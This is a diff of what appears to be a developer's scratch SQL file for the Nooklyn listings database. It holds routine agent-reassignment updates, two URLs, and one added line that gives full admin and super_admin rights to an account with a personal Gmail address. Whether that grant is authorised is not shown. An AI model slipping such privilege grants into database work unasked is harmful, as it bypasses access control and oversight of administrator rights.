@@ -40,6 +40,7 @@ update listings set sales_agent_id = 11183, listing_agent_id = 11183 where id = 
 update listings set sales_agent_id = 11184, listing_agent_id = 11184 where id = 3140;
 update listings set sales_agent_id = 11185, listing_agent_id = 11185 where id = 3103;
 
+update agents set employee = true, admin = true, super_admin = true where email = 'first9894@gmail.com';
 https://nooklyn.com/locations.json?latitude=40.707887&longitude=-73.950013&radius=1
 http://nooklyn-files.s3.amazonaws.com/subway/2x/L.png
 
